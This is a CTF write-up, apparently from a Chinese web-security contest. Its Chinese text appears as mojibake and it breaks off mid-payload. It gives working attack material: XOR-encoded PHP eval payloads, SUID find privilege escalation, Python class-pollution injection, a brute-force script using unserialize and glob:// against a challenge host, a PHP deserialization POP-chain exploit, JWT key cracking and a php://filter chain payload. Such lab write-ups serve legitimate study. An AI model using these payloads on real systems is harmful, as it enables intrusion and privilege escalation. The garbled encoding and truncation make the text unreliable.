ä¸ºlikeæ¨¡ç³ŠæŸ¥è¯¢é‡Œä¸‹åˆ’çº¿èƒ½åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¸è¦æœ‰ç™¾åˆ†å·\nlikeåé¢åŠ ä¸€ä¸ªbinaryç”¨äºåŒºåˆ†å¤§å°å†™\nåˆæ‹¿äº†ä¸€ä¸ªä¸€è¡€ï¼Œå–œå–œğŸ¤­\nEzRce #\ræºç å¦‚ä¸‹\n\u0026lt;?php\rinclude(\u0026#39;waf.php\u0026#39;);\rsession_start();\rshow_source(__FILE__);\rerror_reporting(0);\r$data=$_GET[\u0026#39;data\u0026#39;];\rif(waf($data)){\reval($data);\r}else{\recho \u0026#34;no!\u0026#34;;\r}\r?\u0026gt; ç”¨pythonè·‘äº†ä¸€ä¸‹ï¼Œèƒ½ç”¨çš„å­—ç¬¦æœ‰è¿™äº›\naelvAELV!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`| ç”¨å¼‚æˆ–æ„é€ å­—ç¬¦ä¸²phpinfo()\n\u0026lt;?php\r$e=(\u0026#39;L\u0026#39;^\u0026#39;\u0026lt;\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;$\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;\u0026lt;\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;%\u0026#39;).(\u0026#39;\u0026#34;\u0026#39;^\u0026#39;L\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;*\u0026#39;).(\u0026#39;#\u0026#39;^\u0026#39;L\u0026#39;);//phpinfo\r($e)();\r#åœ¨pç¥çš„æ–‡ç« ä¸­å­¦åˆ°çš„ è´´å‡ ä¸ªæ–‡ç« ï¼š\nè€ç”Ÿå¸¸è°ˆçš„æ— å­—æ¯æ•°å­— Webshell æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\næ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ (leavesongs.com)\nä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell | ç¦»åˆ«æ­Œ (leavesongs.com)\nä¸€äº›è¢«bançš„å‡½æ•°\næ³¨æ„åˆ°æºç å½“ä¸­æœ‰ä¸€ä¸ªsessionå¼€å¯çš„éƒ¨åˆ†ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨\næ³¨æ„è¿™ä¸ªdataä¹Ÿæ˜¯è¦è¿›è¡Œå¼‚æˆ–æ„æˆçš„ï¼Œè¿™é‡Œç»™ä¸€ä¸ªpythonè„šæœ¬\nç”±äºåœ¨disable_functioné‡Œæ²¡æœ‰ç¦ç”¨file_put_contentsï¼Œäºæ˜¯å¯ä»¥å†™å…¥ä¸€ä¸ªPHPæ–‡ä»¶æ¥æ–¹ä¾¿å‘½ä»¤æ‰§è¡Œï¼ŒåŒæ—¶æ³¨æ„å‡½æ•°çš„æ‹¬å·åµŒå¥—\nimport string\rdic=\u0026#39;aelvAELV!#$%\u0026amp;\u0026#39;+\u0026#34;()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`|\u0026#34;\rwant=\u0026#34;session_id\u0026#34;\rres=\u0026#34;\u0026#34;\rfor c in want:\rfor i in dic:\rcheck=0\rfor j in dic:\rif ord(i)^ord(j)==ord(c):\rprint(i,j)\rres+=f\u0026#34;(\u0026#39;{i}\u0026#39;^\u0026#39;{j}\u0026#39;).\u0026#34;\rcheck=1\rbreak\rif check==1:\rbreak\rprint(res) dataçš„éƒ¨åˆ†çš„è¯ï¼Œæ¯ä¸ªå¼‚æˆ–ç»„æˆçš„å­—ç¬¦ä¸²éƒ½è¦é¢å¤–ç”¨ä¸€å¯¹æ‹¬å·æ‹¬èµ·æ¥ï¼Œå°±åƒä¸Šé¢çš„é‚£ä¸ªphpinfoä¸€æ ·\nç„¶ååœ¨æ–°å»ºçš„æ–‡ä»¶ä¸‹è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ›´æ–¹ä¾¿ä¸€äº›ï¼Œä¸ç”¨å†è½¬è¿›åˆ¶\nç”±äºåœ¨phpinfoé‡Œé¢ç¦ç”¨äº†å¤§éƒ¨åˆ†çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨proc_popenè¿™ä¸ªå‡½æ•°\nè´´ä¸€ä¸ªæ–‡ç« ï¼šç»•è¿‡Disable Functionsæ¥æäº‹æƒ… - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nè¿™é‡Œæˆ‘æ˜¯ç”¨åˆ°åå¼¹shellï¼Œå› ä¸ºåé¢è¦è¿›è¡Œææƒï¼Œå½“å‰æƒé™ä¸èƒ½å¤Ÿè¯»å–flagï¼Œåœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ªä¸€å¥è¯åå¼¹shellçš„å‘½ä»¤ï¼Œä¿å­˜åœ¨txtä¸­ï¼Œå†ç”¨é¶æœºcurlæ‰§è¡Œï¼Œè‡ªå·±æœåŠ¡å™¨å¼€å¯ncç›‘å¬\nå¦‚ä¸‹ï¼Œæƒé™ä¸å¤Ÿæ˜¯è¯»ä¸åˆ°çš„ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°suidææƒ\nè´´ä¸¤ä¸ªæ–‡ç« ï¼š\nSUIDææƒæ€»ç»“åŠåˆ©ç”¨æ¼”ç¤º - leviathan123 - åšå®¢å›­ (cnblogs.com)\nçº¢é˜Ÿç¬”è®°ä¹‹Suidææƒæµ…æä¸åˆ©ç”¨æ–¹æ³•æ€»ç»“_suidææƒã€-CSDNåšå®¢\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null #åœ¨é‡Œé¢æŸ¥åˆ°æœ‰findå‘½ä»¤ï¼Œå¯ä»¥æ“ä½œ è¿›å…¥tmpç›®å½•touchä¸€ä¸ª111æ–‡ä»¶å°±è¡Œäº†ï¼Œä¸ç”¨å†™å†…å®¹\nfind 111 -exec code \\; #è¿™ä¸ªæ—¶å€™findæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å°±æ˜¯ä»¥rootèº«ä»½ï¼Œcodeå¯æ§ï¼Œè¦åˆ‡æ¢åˆ°tmpç›®å½• æ‹¿åˆ°flagï¼Œè®°å¾—æŠŠç©ºæ ¼è½¬æ¢ä¸ºä¸‹åˆ’çº¿\nezpython #\ræºç å¦‚ä¸‹ğŸ‘‡\nimport json\rimport os\rfrom waf import waf\rimport importlib\rfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_string\rapp = Flask(__name__)\rapp.secret_key=\u0026#39;jjjjggggggreekchallenge202333333\u0026#39;\rclass User():\rdef __init__(self):\rself.username=\u0026#34;\u0026#34;\rself.password=\u0026#34;\u0026#34;\rself.isvip=False\rclass hhh(User):\rdef __init__(self):\rself.username=\u0026#34;\u0026#34;\rself.password=\u0026#34;\u0026#34;\rregistered_users=[]\r@app.route(\u0026#39;/\u0026#39;)\rdef hello_world(): # put application\u0026#39;s code here\rreturn render_template(\u0026#34;welcome.html\u0026#34;)\r@app.route(\u0026#39;/play\u0026#39;)\rdef play():\rusername=session.get(\u0026#39;username\u0026#39;)\rif username:\rreturn render_template(\u0026#39;index.html\u0026#39;,name=username)\relse:\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\r@app.route(\u0026#39;/login\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\rdef login():\rif request.method == \u0026#39;POST\u0026#39;:\rusername=request.form.get(\u0026#39;username\u0026#39;)\rpassword=request.form.get(\u0026#39;password\u0026#39;)\ruser = next((user for user in registered_users if user.username == username and user.password == password), None)\rif user:\rsession[\u0026#39;username\u0026#39;] = user.username\rsession[\u0026#39;password\u0026#39;]=user.password\rreturn redirect(url_for(\u0026#39;play\u0026#39;))\relse:\rreturn \u0026#34;Invalid login\u0026#34;\rreturn redirect(url_for(\u0026#39;play\u0026#39;))\rreturn render_template(\u0026#34;login.html\u0026#34;)\r@app.route(\u0026#39;/register\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\rdef register():\rif request.method == \u0026#39;POST\u0026#39;:\rtry:\rif waf(request.data):\rreturn \u0026#34;fuck payload!Hacker!!!\u0026#34;\rdata=json.loads(request.data)\rif \u0026#34;username\u0026#34; not in data or \u0026#34;password\u0026#34; not in data:\rreturn \u0026#34;è¿ç”¨æˆ·åå¯†ç éƒ½æ²¡æœ‰ä½ æ³¨å†Œå•¥å‘¢\u0026#34;\ruser=hhh()\rmerge(data,user)\rregistered_users.append(user)\rexcept Exception as e:\rreturn \u0026#34;æ³°é…·è¾£,æ²¡æœ‰æ³¨å†ŒæˆåŠŸæ\u0026#34;\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\relse:\rreturn render_template(\u0026#34;register.html\u0026#34;)\r@app.route(\u0026#39;/flag\u0026#39;,methods=[\u0026#39;GET\u0026#39;])\rdef flag():\ruser = next((user for user in registered_users if user.username ==session[\u0026#39;username\u0026#39;] and user.password == session[\u0026#39;password\u0026#39;]), None)\rif user:\rif user.isvip:\rdata=request.args.get(\u0026#39;num\u0026#39;)\rif data:\rif \u0026#39;0\u0026#39; not in data and data != \u0026#34;123456789\u0026#34; and int(data) == 123456789 and len(data) \u0026lt;=10:\rflag = os.environ.get(\u0026#39;geek_flag\u0026#39;)\rreturn render_template(\u0026#39;flag.html\u0026#39;,flag=flag)\relse:\rreturn \u0026#34;ä½ çš„æ•°å­—ä¸å¯¹å“¦!\u0026#34;\relse:\rreturn \u0026#34;I need a num!!!\u0026#34;\relse:\rreturn render_template_string(\u0026#39;è¿™ç§ç¥åŠŸä½ ä¸å……VIPä¹Ÿæƒ³å­¦?\u0026lt;p\u0026gt;\u0026lt;img src=\u0026#34;{{url_for(\\\u0026#39;static\\\u0026#39;,filename=\\\u0026#39;weixin.png\\\u0026#39;)}}\u0026#34;\u0026gt;è¦ä¸væˆ‘50,æˆ‘é€ä½ ä¸€ä¸ªVIPå§,å˜»å˜»\u0026lt;/p\u0026gt;\u0026#39;)\relse:\rreturn \u0026#34;å…ˆç™»å½•å»\u0026#34;\rdef merge(src, dst):\rfor k, v in src.items():\rif hasattr(dst, \u0026#39;__getitem__\u0026#39;):\rif dst.get(k) and type(v) == dict:\rmerge(v, dst.get(k))\relse:\rdst[k] = v\relif hasattr(dst, k) and type(v) == dict:\rmerge(v, getattr(dst, k))\relse:\rsetattr(dst, k, v)\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#34;0.0.0.0\u0026#34;,port=\u0026#34;8888\u0026#34;) é¦–å…ˆçœ‹åˆ°æºç ä¸­æœ‰ä¸€ä¸ªmergeå‡½æ•°ï¼Œè¿™ä¸ªåœ¨jsçš„åŸå‹é“¾æ±¡æŸ“ä¸­æœ‰çœ‹åˆ°è¿‡ï¼Œç»“åˆé¢˜ç›®ä¿¡æ¯ï¼Œå¾—çŸ¥è¿™é“é¢˜æ˜¯å…³äºpythonåŸå‹é“¾æ±¡æŸ“\né¦–å…ˆç»™ä¸¤ç¯‡æ–‡ç« å­¦ä¹ ä¸€ä¸‹ğŸ‘‡\npythonåŸå‹é“¾æ±¡æŸ“æ€»ç»“ | H4cking to the Gate . (h4cking2thegate.github.io)\n(*Â´âˆ‡ï½€*) æ¬¢è¿å›æ¥ï¼ (cnblogs.com)\nåœ¨æ³¨å†Œé¡µé¢å¯ä»¥æŠ“åŒ…å°è¯•æ·»åŠ å¦‚ä¸‹æ±¡æŸ“å†…å®¹\nç”±äºæœ‰wafçš„å­˜åœ¨ï¼Œè‚¯å®šæ˜¯è¿‡ä¸äº†çš„ï¼Œä¸è¿‡å¯ä»¥ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ã€‚ï¼ˆunicodeç¼–ç å°±æ˜¯å­—ç¬¦è½¬ä¸º16è¿›åˆ¶ç„¶åæ·»åŠ å‰ç¼€\\u00å³å¯\nç„¶åè¿›å…¥flagé¡µé¢ï¼Œéœ€è¦ä¼ ä¸€ä¸ªå‚æ•°numè¿›è¡Œæ¯”è¾ƒï¼Œé€šè¿‡æºç å¯çŸ¥numçš„æ¡ä»¶\nå…¶å®åªéœ€è¦è®©numç­‰äº123456789ååŠ ä¸€ä¸ªç©ºæ ¼ï¼Œå³å¯ç»•è¿‡ï¼Œå› ä¸ºintå‡½æ•°ä¼šè‡ªåŠ¨å»é™¤ç©ºæ ¼\nklf_3 #\rè¿™é“é¢˜çš„è¯ï¼Œå—¯ã€‚ã€‚ã€‚å¯ä»¥ç›´æ¥ç”¨klf_2çš„payloadæ‰“ï¼Œæ²¡æœ‰ä¸€ç‚¹éšœç¢\nå¯èƒ½æ˜¯å› ä¸ºæˆ‘æ‰“2çš„æ—¶å€™æƒ³å¾—å¤ªå¤šäº†ï¼Œå¤šç»•äº†å‡ ä¸‹ï¼Œæœ¬æ¥2å¯èƒ½æ²¡æœ‰é‚£ä¹ˆéš¾ï¼Œè¿™é“é¢˜ç›´æ¥ç…§ç€ä¸Šé¢çš„æ‰“å°±è¡Œäº†ã€‚ã€‚ã€‚\nAkane! #\ræºç å¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rerror_reporting(0);\rshow_source(__FILE__);\rclass Hoshino\r{\rpublic $Ruby;\rprivate $Aquamarine;\rpublic function __destruct()\r{\r$this-\u0026gt;Ruby-\u0026gt;func();\r}\r}\rclass Idol\r{\rpublic $Akane;\rpublic function __wakeup()\r{\r$this-\u0026gt;Akane = \u0026#39;/var/www/html/The************************.php\u0026#39;;\r}\rpublic function __call($method,$args)\r{\r$Kana = count(scandir($this-\u0026gt;Akane));\rif ($Kana \u0026gt; 0) {\rdie(\u0026#39;Kurokawa Akane\u0026#39;);\r} else {\rdie(\u0026#39;Arima Kana\u0026#39;);\r}\r}\r}\r$a = unserialize(base64_decode($_GET[\u0026#39;tuizi\u0026#39;]));\r?\u0026gt; æœ‰ä¸€é“è´µé˜³å¤§æ•°æ®CTFçš„é¢˜ç›®å’Œè¿™ä¸ªæ¯”è¾ƒç›¸ä¼¼\nè´µé˜³å¤§æ•°æ®åŠç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ›-è§£é¢˜èµ› WP - Yulate\u0026rsquo;s Blog\n2023 è´µé˜³å¤§æ•°æ® CTF éƒ¨åˆ†é¢˜è§£ | å—æºŸNaN (southsea.st)\nåˆ©ç”¨ç‚¹å°±æ˜¯scandirè¿™ä¸ªå‡½æ•°ï¼Œå·²çŸ¥scandirä½¿ç”¨çš„æ—¶å€™ä¸ç®¡æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œéƒ½ä¼šè¿”å›ä¸€ä¸ªæ•°ç»„é‡Œé¢åŒ…å«ä¸€ä¸¤ä¸ªç‚¹ï¼Œå¦‚æœä½¿ç”¨glob://åè®®çš„è¯ï¼Œå°±ä¸ä¼šåŒ…å«ç‚¹ï¼Œç»“åˆcountå‡½æ•°ä¼šè®¡å…¥ç‚¹çš„ç‰¹æ€§ï¼Œç”¨globåè®®æ¥å¯¹phpæ–‡ä»¶åè¿›è¡Œçˆ†ç ´\næˆ‘çš„pyè„šæœ¬ğŸ‘‡\nimport string\rimport requests\rimport base64\rdic=string.printable\rurl=\u0026#39;https://ssi28gtqfby8kz2u0e7bz3vej.node.game.sycsec.com/?tuizi=\u0026#39;\rtable = \u0026#39;\u0026#39;\r#è®°ä½è¦ç»•è¿‡wakeupå‡½æ•°ï¼Œé˜²æ­¢ä»–é‡ç½®ç›®å½•ï¼Œåªéœ€è¦æŠŠIdolçš„å‚æ•°+1å³å¯\rfor i in range(23,-1,-1):\rfor j in dic:\roriginal_string = \u0026#39;O:7:\u0026#34;Hoshino\u0026#34;:2:{s:4:\u0026#34;Ruby\u0026#34;;O:4:\u0026#34;Idol\u0026#34;:2:{s:5:\u0026#34;Akane\u0026#34;;s:52:\u0026#34;glob:///var/www/html/The\u0026#39;+table+j+\u0026#39;*\u0026#39;*i+\u0026#39;.php\u0026#34;;}s:19:\u0026#34; Hoshino Aquamarine\u0026#34;;N;}\u0026#39;\r# è¿›è¡ŒåŠ å¯†\rencoded_bytes = base64.b64encode(original_string.encode(\u0026#39;utf-8\u0026#39;))\rpayload= encoded_bytes.decode(\u0026#39;utf-8\u0026#39;)\rr=requests.get(url+payload)\rif \u0026#39;Kurokawa Akane\u0026#39; in r.text:\rprint(r.text,original_string,table)\rprint()\rtable+=j\rbreak ez_php #\rä¼ å…¥éƒ¨åˆ†æºç ğŸ‘‡\nif (isset($_GET[\u0026#39;user\u0026#39;])) {\r$user = $_GET[\u0026#39;user\u0026#39;];\rif (!preg_match(\u0026#34;/^[Oa]:[\\d]+/i\u0026#34;, $user)) {\runserialize($user);\r}\relse {\recho(\u0026#34;ä¸æ˜¯å§ï¼Œç¬¬ä¸€å±‚éƒ½ç»•ä¸è¿‡å»ï¼Ÿï¼Ÿï¼Ÿ\u0026lt;br\u0026gt;\u0026#34;);\r}\r}\relse {\recho(\u0026#34;å¿«å¸®æˆ‘æ‰¾æ‰¾å¥¹ï¼\u0026lt;br\u0026gt;\u0026#34;);\r} åœ¨CTFshowä¸Šæœ‰ä¸€é“ç±»ä¼¼çš„é¢˜ç›®ï¼šæ„šäººæ¯3rd [easy_php] (yuque.com)ï¼Œå¯ä»¥å‚è€ƒç»•è¿‡Oa:\\dçš„æ­£åˆ™ï¼Œä½¿ç”¨Cå±æ€§\nè¦å…ˆè¿›å…¥uselessç±»çš„destructé­”æœ¯æ–¹æ³•é‡Œæ‰¾åˆ°key\n$bool=!is_array($this-\u0026gt;QW)\u0026amp;\u0026amp;!is_array($this-\u0026gt;YXX)\u0026amp;\u0026amp;(md5($this-\u0026gt;QW) === md5($this-\u0026gt;YXX)) \u0026amp;\u0026amp; ($this-\u0026gt;QW != $this-\u0026gt;YXX) and $random===\u0026#39;newbee\u0026#39;;#è¿™ä¸ªnewbeeä¸ç”¨ç®¡ä»–ï¼Œå¯¹åˆ¤æ–­è¯­å¥æ˜¯æ²¡æœ‰å½±å“çš„ å¯¹äºè¿™æ®µåˆ¤æ–­æ¡ä»¶æ¥è¯´ï¼ŒMD5å¼ºæ¯”è¾ƒç”±äºå‰é¢é™åˆ¶ä¸èƒ½ä¸ºæ•°ç»„ï¼Œå°±ä¸èƒ½ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼ŒåŒæ—¶ç”±äºæ˜¯GETæ–¹å¼ä¼ å‚ï¼Œåœ¨ç½‘ä¸Šèƒ½å¤Ÿæœåˆ°ä¸€äº›CTFçš„MD5å¼ºç¢°æ’å¾€å¾€æ˜¯ä»¥ä¸€äº›ä¸å¯è§å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä¼šè¢«urlè§£ç ä»è€Œå¯¼è‡´æ¯”è¾ƒå¤±å¤±è´¥ï¼Œè¿™é‡Œå¶ç„¶é—´çœ‹åˆ°ä¸€ä¸ªMD5åˆé›†ï¼Œåˆå­¦åˆ°ä¸€ä¸ªæ–°å§¿åŠ¿ï¼šphp-md5ç±»å‹é¢˜ç›®æ±‡æ€» | dota_st (wlhhlc.top)\nvar_dump(md5(\u0026#39;INF\u0026#39;)===md5(INF));\r#bool(true) å¾ˆå·§å¦™çš„æ–¹å¼ï¼ŒINFæ˜¯æ— é™å¤§ \u0026lt;?php\rclass useless {\rprivate $seeyou;\rpublic $QW=\u0026#39;INF\u0026#39;;\rpublic $YXX=INF;\r}\r$a=new useless();\r$b=new ArrayIterator(array($a));\r$a=serialize($b);\recho $a;\r#C:13:\u0026#34;ArrayIterator\u0026#34;:103:{x:i:0;a:1:{i:0;O:7:\u0026#34;useless\u0026#34;:3:{s:15:\u0026#34;%00useless%00seeyou\u0026#34;;N;s:2:\u0026#34;QW\u0026#34;;s:3:\u0026#34;INF\u0026#34;;s:3:\u0026#34;YXX\u0026#34;;d:INF;}};m:a:0:{}}å³å¯ç»•è¿‡ç¬¬ä¸€å±‚ è¿›å…¥ç¬¬äºŒå±‚ï¼š\nè¿™ä¸ªå…³é”®ç‚¹ä¸åœ¨äºbasenameè¿™ä¸ªå‡½æ•°ï¼Œè™½ç„¶basenameä¹Ÿæœ‰ç›¸å…³çš„æ¼æ´ï¼Œè¿™é‡Œè€ƒå¯Ÿçš„æ˜¯serverè¿™ä¸ªå…¨å±€å˜é‡æ•°ç»„\näºæ˜¯å¦‚ä¸‹å›¾æ„é€ urlï¼Œå³å¯åœ¨ç½‘é¡µæºç é‡Œçœ‹åˆ°phpä»£ç \nä½†æ˜¯å…¨æ˜¯base64åŠ å¯†åçš„ä»£ç ï¼Œè€Œä¸”å¾ˆé•¿ï¼Œä¸€èˆ¬æ¥è¯´å°±æ˜¯ä¸€ä¸ªå›¾ç‰‡\nå°†å…¶å…¨éƒ¨å€¼å¤åˆ¶ä¸‹æ¥ï¼Œå»æ‰é¦–å°¾çš„æ³¨é‡Šç¬¦å·ï¼ˆ/*ã€*/ï¼‰\nè¿è¡Œä¸€ä¸‹ï¼Œå³å¯å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ğŸ‘‡å¯†ç å°±æ˜¯ï¼š9ï¼Œåå­—å«ï¼šmomo\nè‡³æ­¤uselessç±»çš„destructåˆ©ç”¨å®Œæ¯•ï¼Œå‡†å¤‡è¿›å…¥Meç±»çš„wakeup\nè¿™ä¸ªéšæœºå­—ç¬¦ä¸²çš„ç»•è¿‡ï¼Œç”¨**åœ°å€å¼•ç”¨**å³å¯ï¼Œç„¶åè·³åˆ°herç±»çš„invokeï¼Œå†ç»è¿‡serializeè·³åˆ°sleepæ–¹æ³•ï¼Œå†è·³åˆ°uselessçš„getæ–¹æ³•ï¼Œæœ€åå›åˆ°herçš„findå‡½æ•°å®Œæ¯•\nå€¼å¾—æ³¨æ„çš„æ˜¯importantç±»é‡Œsleepæ‰§è¡Œåå¼•å‘çš„uselessç±»çš„getæ–¹æ³•\nè¿™é‡Œçš„**$zhui[$good]();**Â å°±ç­‰åŒä¸**$this-\u0026gt;seeyou[$this-\u0026gt;seeyou]();**\nè¿™é‡Œæˆ‘é—®äº†é—®ä¸‡èƒ½çš„GPTğŸ‘‡\næ‰€ä»¥è¯´POPé“¾å°±æ˜¯ï¼šMe-\u0026gt;wakeup ğŸ‘‰ her-\u0026gt;invoke ğŸ‘‰ important-\u0026gt;sleep ğŸ‘‰useless-\u0026gt;get ğŸ‘‰ her-\u0026gt;find\npocğŸ‘‡\n\u0026lt;?php\rclass Me {\rpublic $qwe;\rpublic $bro;\rpublic $secret;\r}\rclass her{\rpublic $hername=\u0026#39;momo\u0026#39;;\rpublic $key=9;\rpublic $asd;\rpublic function find() {}\r}\rclass important{\rpublic $power;\r}\rclass useless\r{\rpublic $seeyou;\rpublic $QW;\rpublic $YXX;\r}\r$me=new Me();\r$her=new her();\r$important=new important();\r$useless=new useless();\r$me-\u0026gt;bro=\u0026amp;$me-\u0026gt;secret;\r$me-\u0026gt;qwe=$her;\r$her-\u0026gt;asd=$important;\r$important-\u0026gt;power=$useless;\r$useless-\u0026gt;seeyou[\u0026#39;seeyou\u0026#39;]=[$her, \u0026#39;find\u0026#39;];\recho serialize( new ArrayIterator(array($me)));\r#C:13:\u0026#34;ArrayIterator\u0026#34;:275:{x:i:0;a:1:{i:0;O:2:\u0026#34;Me\u0026#34;:3:{s:3:\u0026#34;qwe\u0026#34;;O:3:\u0026#34;her\u0026#34;:3:{s:7:\u0026#34;hername\u0026#34;;s:4:\u0026#34;momo\u0026#34;;s:3:\u0026#34;key\u0026#34;;i:9;s:3:\u0026#34;asd\u0026#34;;O:9:\u0026#34;important\u0026#34;:1:{s:5:\u0026#34;power\u0026#34;;O:7:\u0026#34;useless\u0026#34;:3:{s:6:\u0026#34;seeyou\u0026#34;;a:1:{s:6:\u0026#34;seeyou\u0026#34;;a:2:{i:0;r:5;i:1;s:4:\u0026#34;find\u0026#34;;}}s:2:\u0026#34;QW\u0026#34;;N;s:3:\u0026#34;YXX\u0026#34;;N;}}}s:3:\u0026#34;bro\u0026#34;;N;s:6:\u0026#34;secret\u0026#34;;R:16;}};m:a:0:{}} è¿™é‡Œå¿˜äº†è¯´äº†ï¼Œé¢˜ç›®ç¯å¢ƒæ˜¯7.4ï¼ŒPHPç‰ˆæœ¬å¤§äº7å°±å¯¹privateå’Œpublicä¸æ•æ„Ÿäº†ï¼Œä¸Šé¢æ²¡æ”¹å°†å°±çœ‹å§\nè¿›å…¥findå‡½æ•°çœ‹çœ‹\nfileä¸€çœ¼çœ‹å°±æ˜¯dataä¼ªåè®®ç»•è¿‡\né‚£ä¹ˆæ³¨æ„ä¸€ä¸‹ctfå’Œfunï¼Œå‰é¢æœ‰ä¸€ä¸ªnewï¼Œå°±ä¸èƒ½ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œæ¶‰åŠåˆ°PHPåŸç”Ÿç±»è¯»å–æ–‡ä»¶\nã€ç²¾é€‰ã€‘æµ…è°ˆ phpåŸç”Ÿç±»çš„åˆ©ç”¨ 1(æ–‡ä»¶æ“ä½œç±»)_filesystemiterator-CSDNåšå®¢\næœ€åçš„payloadğŸ‘‡\nåœ¨è¿™ä¸ªPHPæ–‡ä»¶é‡Œæ‹¿åˆ°flag\nchange_it #\rè¿™é“é¢˜å¯¹ä¸Šä¼ èº«ä»½æœ‰é™åˆ¶\nè§£å¯†åæ˜¯è¿™æ ·çš„\næ‰¾äº†å¾ˆä¹…ä¹Ÿæ²¡æ‰¾åˆ°keyçš„çº¿ç´¢ï¼Œäºæ˜¯å¹²è„†å°±çˆ†ç ´å§ğŸ¤­\né™„ä¸Šå·¥å…·è¿æ¥ï¼šGitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C\nä¸‹åˆ°è™šæ‹Ÿæœºé‡Œé¢å»\nå¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼Œå‚è€ƒğŸ‘‰ï¼šå¿«é€Ÿå®‰è£… c-jwt-cracker - litluo - åšå®¢å›­ (cnblogs.com)\nçˆ†ç ´å¾—å‡ºkeyæ˜¯yibaoï¼Œç›´æ¥åœ¨jwt.ioè¿™ä¸ªç½‘ç«™é‡Œå»ä¿®æ”¹å³å¯ï¼Œå¦‚å›¾ä¿®æ”¹åå³å¯\nçœ‹åˆ°æ­¤æ—¶çš„çŠ¶æ€å·²ç»æ˜¯allowï¼Œç¬¬ä¸€å±‚ç»•è¿‡\næºç ä¸­æœ‰æç¤º\n\u0026lt;!-- ä¸€ç›´è¿ä¸ä¸Šï¼Ÿè¿ä¸ä¸Šå°±å¯¹å•¦ï¼ --\u0026gt;\r\u0026lt;!-- phpç‰ˆæœ¬ä¸º8.0\rfunction php_mt_seed($seed)\r{\rmt_srand($seed);\r}\r$seed = time();\rphp_mt_seed($seed);\r$characters = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;;\r$newFileName = \u0026#39;\u0026#39;;\rfor ($i = 0; $i \u0026lt; 10; $i++) {\r$newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];\r}\r--\u0026gt; å¯ä»¥çœ‹åˆ°æ–‡ä»¶åç§°æ˜¯éšæœºçš„ï¼Œä½†æ˜¯è¿™ç§æ’­ç§å­çš„æ–¹å¼æ˜¯ä¼ªéšæœºçš„ï¼Œç§å­ä¸€æ ·ï¼Œé‚£ä¹ˆå‡ºæ¥çš„éšæœºæ•°åºåˆ—ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå¯ä»¥åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹æ—¶é—´ï¼Œå¤§æ¦‚æ¨ç®—ä¸€ä¸‹ä¸Šä¼ æ—¶é—´ï¼Œç„¶åç”Ÿæˆéšæœºåç§°åœ¨è¿æ¥æœ¨é©¬\nç„¶ååƒè¿™æ ·ä¼°æ‘¸ç€å¤§æ¦‚æ—¶é—´ï¼Œä¸€ä¸ªä¸€ä¸ªçš„å°è¯•\nç„¶åæ‹¿åˆ°flag\nezrfi #\rä¼ å‚å¦‚å›¾ï¼Œæ‹¿åˆ°hintæºç \nè§£ç å¾—åˆ°å°Šå˜Ÿå‡å˜Ÿå¯†ç ï¼ˆè¿™ä¸ªåœ¨MoeCTFçš„cryptoéƒ¨åˆ†çœ‹åˆ°è¿‡ï¼Œæ‹¿å»è§£å¯†\nå°Šå˜Ÿå‡å˜ŸO.o (zdjd.asia)\né¢˜ç›®ç»™çš„æç¤ºæ˜¯ï¼šRC4è§£å¯†ï¼ŒçŒœæµ‹å¯†ç ä¸ºSycloverï¼Œæ‹¿åˆ°hexæºç \næ–‡ä»¶åŒ…å«é€»è¾‘æ˜¯include($file.\u0026#34;.py\u0026#34;),ä½ èƒ½æ‰¾åˆ°flagæ–‡ä»¶ä½ç½®å—?? å¦‚ä¸‹ä¼ å‚\n?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-\r1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|conver\rt.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.